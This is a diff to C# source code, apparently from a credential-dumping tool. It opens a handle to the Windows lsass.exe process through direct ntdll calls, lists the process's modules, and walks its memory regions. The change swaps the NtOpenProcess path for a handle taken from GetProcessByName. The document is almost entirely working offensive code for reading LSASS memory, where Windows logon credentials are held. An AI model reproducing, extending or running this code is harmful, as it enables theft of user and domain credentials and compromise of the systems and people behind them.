@@ -46,26 +46,6 @@ namespace Shock
         }
 
 
-        [StructLayout(LayoutKind.Sequential, Pack = 0)]
-        public struct OBJECT_ATTRIBUTES
-        {
-            public int Length;
-            public IntPtr RootDirectory;
-            public IntPtr ObjectName;
-            public uint Attributes;
-            public IntPtr SecurityDescriptor;
-            public IntPtr SecurityQualityOfService;
-        }
-
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct CLIENT_ID
-        {
-            public IntPtr UniqueProcess;
-            public IntPtr UniqueThread;
-        }
-
-
         [StructLayout(LayoutKind.Sequential)]
         public struct MEMORY_BASIC_INFORMATION
         {
@@ -87,9 +67,6 @@ namespace Shock
 
         [DllImport("ntdll.dll")]
         public static extern uint NtClose(IntPtr hObject);
-
-        [DllImport("ntdll.dll")]
-        public static extern uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID processId);
 
         [DllImport("ntdll.dll", SetLastError = true)]
         public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);
@@ -176,7 +153,6 @@ namespace Shock
             }
             return unicode_str;
         }
-
 
 
         public unsafe static List<ModuleInformation> CustomGetModuleHandle(IntPtr hProcess)
@@ -332,29 +308,15 @@ namespace Shock
 
             // Get process name
             string proc_name = "lsass.exe";
-            IntPtr process_handle = GetProcessByName(proc_name).First();
-            int processPID = get_pid(process_handle);
-            
-            // Get process handle with NtOpenProcess
-            IntPtr processHandle = IntPtr.Zero;
-            CLIENT_ID client_id = new CLIENT_ID();
-            client_id.UniqueProcess = (IntPtr)processPID;
-            client_id.UniqueThread = IntPtr.Zero;
-            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
-            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
-            if (ntstatus != 0)
-            {
-                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
-            }
+            IntPtr processHandle = GetProcessByName(proc_name).First();
             Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
+
+            // List to get modules information
+            List<ModuleInformation> moduleInformationList = CustomGetModuleHandle(processHandle);
 
             // Loop the memory regions
             long proc_max_address_l = (long)0x7FFFFFFEFFFF;
             IntPtr mem_address = IntPtr.Zero;
-
-            // Get modules information
-            List<ModuleInformation> moduleInformationList = CustomGetModuleHandle(processHandle);
-
             int aux_size = 0;
             string aux_name = "";
 
@@ -362,7 +324,7 @@ namespace Shock
             {
                 // Populate MEMORY_BASIC_INFORMATION struct
                 MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
-                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
+                uint ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
                 if (ntstatus != 0)
                 {
                     Console.WriteLine("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
